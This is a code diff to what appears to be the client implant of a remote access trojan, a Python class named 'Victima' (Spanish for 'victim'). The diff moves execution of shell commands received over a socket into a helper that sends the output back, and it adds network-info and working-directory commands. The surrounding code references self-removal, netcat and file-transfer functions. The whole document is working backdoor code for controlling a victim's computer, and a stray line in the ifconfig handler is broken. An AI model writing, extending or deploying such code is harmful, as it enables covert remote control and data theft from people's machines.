@@ -71,6 +71,22 @@ class Victima(object):
 		msg = (raw_msg).decode('utf-8')
 		return msg
 
+
+	def enviar_completo(self,datos):
+		comando = subprocess.Popen ((datos).strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.PIPE, universal_newlines=True)
+
+		salida = [x for x in comando.stdout.readlines()]
+		self.enviar(str(len(salida)))
+		time.sleep(0.001)
+
+		for _ in salida:
+			#print(_)
+			self.enviar(_)
+			time.sleep(0.001)
+
+		return
+
+
 	def recibir_bytes(self):
 		raw_msg = self.client.recv(1024) 
 		return raw_msg
@@ -123,6 +139,12 @@ class Victima(object):
 			elif (datosEleccion=="autoremover"):
 				self.autoremover()
 
+			elif (datosEleccion=="ifconfig"):
+				self.ifconfig(plataforma)
+
+			elif (datosEleccion=="pwd"):
+				self.pwd()
+
 
 		return
 
@@ -143,6 +165,7 @@ class Victima(object):
 				
 				try:
 					os.chdir(directorio)
+					directorio = os.getcwd()
 					self.client.send(bytes("\n Ubicacion cambiada a: " + directorio,"utf-8"))
 				except OSError: 
 					self.client.send(bytes("\n No existe la ubicacion...",'utf-8'))
@@ -152,27 +175,8 @@ class Victima(object):
 				self.enviar("ok")
 				break
 
-
 			else:
-				#try:
-					
-				comando = subprocess.Popen ((datos).strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.PIPE, universal_newlines=True)
-				#print(datos)
-				#salida_texto = comando.stdout.read() + comando.stderr.read()
-				#salida_completa = (salida_texto).decode('utf-8') + "\n Comando utilizado: "+datos
-				
-				#except UnicodeDecodeError:
-				#	salida_completa = unicode(salida_texto,errors='ignore') + "\n Comando utilizado: "+datos
-
-				salida = [x for x in comando.stdout.readlines()]
-				self.enviar(str(len(salida)))
-				time.sleep(0.001)
-
-				for _ in salida:
-					#print(_)
-					self.enviar(_)
-					time.sleep(0.001)
-
+				self.enviar_completo(datos)
 
 			datos = self.recibir()
 
@@ -219,7 +223,6 @@ class Victima(object):
 		self.recibir()
 		time.sleep(1)
 
-
 		# Se prepara para el envio de datos del archivo
 		with open(origen, "rb") as archivo_origen:
 				contenido = archivo_origen.read(1024)
@@ -227,7 +230,7 @@ class Victima(object):
 					self.client.sendall(contenido)
 					contenido = archivo_origen.read(1024) 
 
-		return
+		return 
 
 
 	def netcat(self):
@@ -246,6 +249,28 @@ class Victima(object):
 	def autoremover(self):
 		proceso,msg = autoremover.activar(plataforma)
 		self.enviar(msg)
+		return
+
+
+	def ifconfig(self,plataforma):
+		
+		if (plataforma=="win"):
+			self.enviar_completo("ipconfig")
+
+		elif (plataforma=="linux") or (plataforma=="mac"):
+			t
+			self.enviar_completo("ip addr")
+
+		return
+
+	def pwd(self):
+
+		if (plataforma=="win"):
+			self.enviar_completo("echo %cd%")
+
+		elif (plataforma=="linux") or (plataforma=="mac"):
+			self.enviar_completo("pwd")
+
 		return
 
 
